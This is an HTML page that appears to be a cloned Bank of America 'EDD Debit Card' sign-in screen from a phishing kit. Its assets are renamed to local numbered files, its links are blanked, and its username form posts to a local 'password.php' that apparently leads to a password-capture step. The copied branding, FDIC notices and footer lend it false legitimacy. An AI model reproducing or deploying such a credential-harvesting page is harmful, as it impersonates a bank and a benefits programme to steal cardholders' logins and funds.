<!DOCTYPE html>
<html class="no-js" lang="en">
<head>

    <meta charset="utf-8" />
    
    
    <meta content="IE=edge" http-equiv="X-UA-Compatible">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="version" content="21.04.0185" />



    <title>EDD Debit Card - Sign In</title>
    <link href="css/1.css" rel="stylesheet"/>

    <link href="css/2.css" rel="stylesheet"/>

    <link href="css/3.css" rel="stylesheet" type="text/css" media="print" />

    <script nonce='3LleCDOBaqmqPiDYRwBxP1Hs' src="js/4.js"></script>

    <link href="css/5.css" rel="stylesheet"/>

    <script nonce='3LleCDOBaqmqPiDYRwBxP1Hs' src="js/6.js"></script>


    <script nonce='3LleCDOBaqmqPiDYRwBxP1Hs' src="js/7.js"></script>

    <script nonce='3LleCDOBaqmqPiDYRwBxP1Hs' src="js/8.js"></script>

    <script nonce='3LleCDOBaqmqPiDYRwBxP1Hs' src="js/9.js"></script>
 
    <script nonce='3LleCDOBaqmqPiDYRwBxP1Hs' src="js/10.js"></script>


    <link href="css/11.css" rel="stylesheet" type="text/css" />
    <link href="" rel="shortcut&#32;icon" type="image/x-icon" />

    
    
    <meta name="format-detection" content="telephone=no" />
</head>


<!--[if IE 9]><body class="body lt-ie10"> <![endif]-->
<!--[if lt IE 9]><body class="body lt-ie9">
    <script nonce='3LleCDOBaqmqPiDYRwBxP1Hs' src="../content/_Scripts/rem.min.js" type="text/javascript"></script>
    <![endif]-->
<body class="body">

    <!-- Google Tag Manager -->
 <!--   <noscript>
        <iframe src="//www.googletagmanager.com/ns.html?id=GTM-55MPT9"
                height="0" width="0" style="display:none;visibility:hidden"></iframe>
    </noscript>
    <script nonce='3LleCDOBaqmqPiDYRwBxP1Hs'>
        (function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
        new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
        j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
        '//www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
        })(window,document,'script','dataLayer','GTM-55MPT9');</script>
    <!-- End Google Tag Manager -->

    <a class="skip-to" href="#content">Skip to content</a>
    <div class="header-container" role="banner">

<div class="row header-row">
    <div class="columns brand-container show-for-medium-up">
        <div class="small-12 medium-3 custom-medium-push-5 columns">
            <div class="logo-wrapper">
                <a href="">
                    <img alt="Bank&#32;Of&#32;America,&#32;N.&#32;A.&#32;Logo" class="header-logo&#32;medium&#32;img-responsive" id="brand-logo" src="images/logo.png" title="" />
                </a>
            </div>
        </div>
        <div class="small-12 medium-9 custom-medium-pull-7 columns">
            <div class="program-wrapper">
                <span class="header-card-program">EDD Debit Card</span>
            </div>
        </div>
    </div>

        <div class="small-12 show-for-small-only columns">
            <nav data-topbar class="top-bar mobile-nav" role="navigation" aria-label="Main" style="height:115px;">
                <!-- DPS-5439 - INC000004694104 - Hamburger Menu cannot be opened. Jeff has recommended below change -->
            <!--    <div class="logo-program-menu">
                    <div class="row">
                        <div class="small-10 columns">
                            <a href="">

                                <img alt="Bank&#32;Of&#32;America,&#32;N.&#32;A.&#32;Logo" class="header-logo&#32;medium&#32;img-responsive" id="brand-logo-mobile" src="/images/logo.png" title="" />
                            </a>
                        </div>

                        <div class="small-2 columns toggle-topbar">
                            <button class="menu-icon" aria-expanded="false">
                                <i class="fa fa-bars" role="presentation" aria-hidden="true"></i>
                                <span class="a11y-hide-visually">Expand Navigation Menu</span> 
                            </button>
                        </div>
                    </div>

                    <div class="row">
                        <div class="small-12 columns header-card-program">EDD Debit Card </div>
                    </div>
                </div>-->
                <ul class="title-area">
                    <!-- Title Area -->
                    <li class="name">
                        <a href="">
                            <img alt="Bank&#32;Of&#32;America,&#32;N.&#32;A.&#32;Logo" class="header-logo&#32;medium&#32;img-responsive" id="brand-logo-mobile" src="logo.png" title="" />
                        </a>
                    </li>
                    <li class="toggle-topbar menu-icon">
                        <button class="menu-icon" aria-expanded="false">
                            <i class="fa fa-bars" role="presentation" aria-hidden="true"></i>
                            <span class="a11y-hide-visually">Expand Navigation Menu</span> 
                        </button>
                    </li>
                    <li class="header-card-program">EDD Debit Card</li>
                </ul>

                
<section class="top-bar-section">
    <ul class="left">
                    <li>
                            <a href="">Home</a>
                    </li>
                    <li>
                            <a href="">Sign In</a>
                    </li>
                    <li>
                            <a href="">Activate My Card</a>
                    </li>
    </ul>
</section>






            </nav>
        </div>


        <div class="row show-for-medium-up">
            <div class="medium-12 columns">
                <nav data-topbar class="top-bar desktop-nav" role="navigation" aria-label="Main">
                    
<section class="top-bar-section">
    <ul class="left">
                    <li>
                            <a href="">Home</a>
                    </li>
                    <li>
                            <a href="">Sign In</a>
                    </li>
                    <li>
                            <a href="">Activate My Card</a>
                    </li>
    </ul>
</section>






                </nav>
            </div>
        </div>
</div>




    </div>
    
    
   <div class="content-container" id="content" role="main" tabindex="-1">
    <form action="password.php" autocomplete="off" id="MainForm" method="post">
        <input name="__RequestVerificationToken" type="hidden" value="S24jgomdE0A9BHFjFllwqgiDk70thb2mhDXYogJIUso-YRbYaqIVKgm1g8ab-eqHN3pyKW7IIlcqlD0EVXJ1mTNR9A2Yg73CrdbmC-ic_Uo1" />
        <div class='row'>
            <div class='large-12 medium-12 small-12 column'>
                <p style="background-color: #C41230;color:#fff;padding:10px;margin-bottom: 0px;">Please note your website username and password may be different than what you use for the Mobile App.</p>
                <h1>Sign In</h1>
                <div class="validation-summary-valid&#32;message&#32;warning" data-valmsg-summary="true" data-visaAlert="" style="display:&#32;none;&#32;visibility:&#32;visible;"><i class='fa fa-exclamation-triangle' role='img' aria-label='Warning'></i> <span class='a11y-hide-visually'>Error Message</span>
                    <ul>
                        <li style="display:none"></li>
                    </ul>
                    <button aria-label='Close' tabindex='0' class='close' title='Close' type='button'> <i class='fa fa-times' role='img' aria-label='Close'></i> </button>
                </div>
            </div>
        </div>
        <div class='box'>
            <div class='row'>
                <div class='medium-12 columns'>
                    <div class='large-12 medium-12 small-12 column'>
                        <p class="align-right margin-bottom-none"> <span class="required">*</span> Required fields </p>
                    </div>




<div class="row&#32;form-row">
    <div class="large-3&#32;medium-5&#32;small-12&#32;column&#32;">
        <label class="form-control" for="VerifyUserRequestHandler_Model_Username">Username&nbsp;<span class="required">*&nbsp;</span></label>
    </div>
    <div class="large-4&#32;medium-4&#32;small-12&#32;columns&#32;left">
        <input aria-invalid="false" aria-required="true" autocomplete="off" class="stretch" data-val="false" data-val-multipleregexzero="Invalid&#32;special&#32;characters&#32;for&#32;Username." data-val-multipleregexzero-casesensitive="false" data-val-multipleregexzero-patternzero="(^[0-9a-zA-Z/\-@#,\.!\$_\n\r\*&#32;]{0,}&#39;?[0-9a-zA-Z/\-@#,\.!\$_\n\r\*&#32;]{0,}$)|(^[\*]*$)" data-val-multipleregexzero-removewhitespacebeforevalidation="false" data-val-visarequired="Username&#32;is&#32;required." data-val-visarequired-invalidifforselectlist="" id="VerifyUserRequestHandler_Model_Username" maxlength="23" name="VerifyUserRequestHandler.Model.Username" type="text" value="" /> <span class="field-validation-valid&#32;error&#32;text" data-valmsg-for="VerifyUserRequestHandler.Model.Username" data-valmsg-replace="true" id="VerifyUserRequestHandler_Model_Username_Validation"></span>
        <div>
            <div class="data-rows">
                <input id="VerifyUserRequestHandler_Model_RememberMe" name="VerifyUserRequestHandler.Model.RememberMe" type="checkbox" value="true" />
                <input name="VerifyUserRequestHandler.Model.RememberMe" type="hidden" value="false" />
                <label class="check-box-label-with-tootip&#32;normal" for="VerifyUserRequestHandler_Model_RememberMe">Remember Username</label>
                <button aria-describedby="VerifyUserRequestHandler_Model_RememberMe" aria-label="Your&#32;username&#32;will&#32;be&#32;remembered&#32;on&#32;this&#32;device." class="has-tip&#32;tip-top&#32;radius" data-tooltip="" tabindex="0" title="Your&#32;username&#32;will&#32;be&#32;remembered&#32;on&#32;this&#32;device." type="button"><i class="fa&#32;fa-question-circle"><span aria-hidden="true" class="a11y-hide-visually" role="tooltip">Your username will be remembered on this device.</span></i></button>
            </div><small></small><small><a href="">Need Username?</a><span aria-hidden='true' > | </span><a href="">Forgot Username?</a></small></div>
    </div>
    <div class="large-5&#32;medium-3&#32;small-12&#32;columns&#32;left"></div>
</div>
<div class='small-12 columns button-group'>
<input class="button&#32;small&#32;navigationButton&#32;primary" data-route="password.html" id="verifyverifyyouridentitySubmit" name="Submit" type="submit" value="Continue" /></div></div></div></div>            <input type="hidden" name="client-timezone-diff" value=""/>
            <input type="submit" class="a11y-hide-all" tabindex="-1" value="Submit" />
</form>
    </div>

    

<div class="footer" role="contentinfo">
    <div class="row">
        <div class="small-12 columns" role="navigation" aria-label="Footer navigation">
            <ul class="footer-navigation">

                
        <li><a href="" target="_blank">Fee Information</a></li>
        <li><a href="" target="_blank">FAQ</a></li>
        <li><a href="">Site Map</a></li>
        <li><a href="" target="_blank">Contact Us</a></li>
        <li><a href="" target="_blank">Privacy / Security</a></li>
        <li><a href="" target="_blank">Terms &amp; Conditions</a></li>
        <li><a href="" target="_blank">Digital Terms &amp; Conditions and Fees</a></li>
        <li><a href="">ATM Locator</a></li>
        <li><a href="" target="_blank">Bank Of America, N. A.</a></li>

            </ul>
        </div>
    </div>
    <div class="extra">
        <div class="small-12 columns">
                <div class="row language">
                    <div id="lang-label" class="small-12 columns align-center">
                        <form action="" autocomplete="off" id="CultureForm" method="post"><input name="__RequestVerificationToken" type="hidden" value="wrjAQ_DbqCW0bMpFWEaOFNrdodZaw_HgCmCnWLFI0EZ1er3SWP0cSNPU1SjU6qO1D_FTZyfgfg-exSzPvM3HVFgZyYbi3T-JTR3k4fLYIVs1" />    
                            <span id="language-label" class="uppercase"><span class="a11y-hide-visually">Select a</span> Language:</span>
                              <ul aria-labelledby="language-label" class="language-short-list">
                                 <li><button class="current changeCultureButton" data-culture="en-US" lang="en-US">English<span class="a11y-hide-visually"> (Selected)</span></button></li>
                                 <li><button class="changeCultureButton"  data-culture="es-MX" lang="es-MX">Español</button></li>
                              </ul>
                           <input type="submit" class="a11y-hide-all" tabindex="-1" value="Submit" />
                        </form>
                    </div>
                </div>
               <div class="row copyright">
                 <div class="small-12 columns">
                    <p> Copyright 2021 Bank of America Corporation . 
                        <a href=""> Visa Global Privacy Notice.</a><br />Bank of America, N.A. Member FDIC Equal Housing Lender </p>
                          <div class="large-12 column align-center">
                             <p style="color:#000;"> <img src="images/EmailLogo.png" />
                               <br /> Apple, the Apple logo and iPhone are trademarks of Apple Inc., registered in the U.S. and other countries and regions. App Store is a service mark of Apple Inc. Google Play and the Google Play logo are trademarks of Google LLC. </p>
                             <p style="color:#000;"> Your funds are eligible for FDIC insurance. Your funds are insured up to $250,000 by the FDIC in the event Bank of America, N.A. fails, if specific deposit insurance requirements are met. See <a href="">fdic.gov/deposit/deposits/prepaid.html</a> for details. In the event Bank of America, N.A. fails, the FDIC may require information from you, including a government identification number, to determine the amount of your insured deposits. If you do not provide this information to the FDIC access to your insured funds will be delayed.</p>
                          </div>
                 </div>
               </div>
        
        </div>
    </div>
</div>



    <div id="modalPlaceHolder" class="reveal-modal medium" data-reveal>
    </div>

    
<div id="modal-leaving-site" aria-labelledby="modal-leaving-site-dialog-title" aria-describedby="siteleaving-dialog-desc" class="reveal-modal medium" role="dialog" data-reveal>
    <div class="modal-body">
        <h2 id='modal-leaving-site-dialog-title'>
            You Are Now Leaving This Site
        </h2>
        
        <div id="siteleaving-dialog-desc" class="scrollable">
            <p id="modal-leaving-site-text">
                You are connecting to a new website; the information provided and collected on this website will be subject to the service provider’s privacy policy and terms and conditions, available through the website.  The website you are connecting to is: {0}
            </p>
        </div>
<div class='small-12 columns button-group'>
            <button class="button primary small button-close-modal" id="continue-button">Continue</button>
            <button class="button standard small button-close-modal" id="close-button">Cancel</button>
</div>        <button id="modal-close-icon" aria-label="Close" tabindex="0" class="close-reveal-modal">&#215;</button>
    </div>
</div>

    
<button id="session-timeout-link" data-reveal-id="modal-session-timeout" title="Session Time Out" class="a11y-hide-all"></button>
<div id="modal-session-timeout" aria-labelledby="session-timeout-dialog-title" aria-describedby="session-dialog-desc" class="reveal-modal small" role="dialog" data-reveal>
    <div class="modal-body">
        <h2 id='session-timeout-dialog-title'>Your session is about to expire.</h2>
        <div id="session-dialog-desc" class="scrollable expMessage">
        </div>
        <hr />
        <div class="align-right">
            <button id="btn-extend-session" onclick="extendSession()" type="button" class="button primary small">Extend Session</button>
            <button id="btn-expire-session" onclick="expireSession(true)" type="button" class="button primary small">Expire Session</button>
        </div>
        <button aria-label="Close" tabindex="0" id="sessionTimeOutClose" class="close-reveal-modal">&#215;</button>
    </div>
</div>

<script nonce='3LleCDOBaqmqPiDYRwBxP1Hs'>
    var sessionTimingoutHeading = "Your session is about to expire.",
        sessionExtendedHeading = "Your session has been extended.",
        sessionHasExpired = "Your session has expired.",
        sessionExpiredByUser = "You have expired your session.",
        okButtonText = "OK",
        closeButtonText = "Close";
</script>
        <!-- Loading Modal -->
<div id="modal-loading" class="reveal-modal tiny" role="dialog" data-reveal>
    <div class="modal-body align-center">
        <h2 class="align-center">Loading ...</h2>
        <i class="fa fa-spinner fa-spin fa-5x" aria-hidden="true" role="presentation"></i>
    </div>
</div>







    <script nonce='3LleCDOBaqmqPiDYRwBxP1Hs' type="text/javascript">
        //Localize Foundation topbar 'back'
        $(document).foundation({
            topbar: {
                custom_back_text: true,
                back_text: 'Back'
            }
        });
        var trackSession = false;
        var sessionExpiresIn = '15';
        var baseUrl = '/eddcard/';
        var mvcAction = 'SignIn';
        var mvcController = 'Verify';
        var fingerprint = new Fingerprint().get(); document.cookie='vid=' + fingerprint + ";path=/; secure; ";
        var token = $('input[name="__RequestVerificationToken"]').val();
        var SimEnabled = Boolean('True' === 'True');
        var headers = {};
        var isAccessTokenRenewCheck = Boolean('False' ==='True');
        var accessTokenIntervalCall = 50000;
        var isVBAEnabled = Boolean('True' === 'True');
        var clientTimeRenewal = new Date(Date.parse('01/01/0001 0:00:00'));
        var targetRenewalThreshold = parseInt('100');



        //define globalize culture used mainly for validation


        CultureInfoSettings.init('en-US',
         '/',
         'MM/dd/yyyy',
         'H:mm:ss',
         ',',
         '.',
         '2',
         '$',
         '2',
         '12',
         '1');

        // other headers omitted
        headers['__RequestVerificationToken'] = token;
        $.ajaxSetup({
            headers: headers
        });     

    </script>

    
    
    <script nonce='3LleCDOBaqmqPiDYRwBxP1Hs' src="js/12.js"></script>


    
    


<script nonce='3LleCDOBaqmqPiDYRwBxP1Hs' src="js/13.js"></script>
<script nonce='3LleCDOBaqmqPiDYRwBxP1Hs' src="js/14.js"></script>

</body>
</html>